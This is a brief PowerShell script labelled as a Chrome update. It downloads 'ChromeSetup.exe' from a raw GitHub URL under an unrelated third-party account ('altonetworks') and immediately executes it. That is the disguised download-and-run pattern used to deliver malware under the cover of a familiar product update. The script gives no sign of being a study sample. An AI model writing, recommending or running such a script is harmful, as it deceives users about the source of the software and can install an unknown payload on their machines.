Clear-Host

echo "[*] Updating Chrome..."
wget https://raw.githubusercontent.com/altonetworks/chrome/refs/heads/main/releases/151.0.7922.72/ChromeSetup.exe -OutFile ChromeSetup.exe
.\ChromeSetup.exe
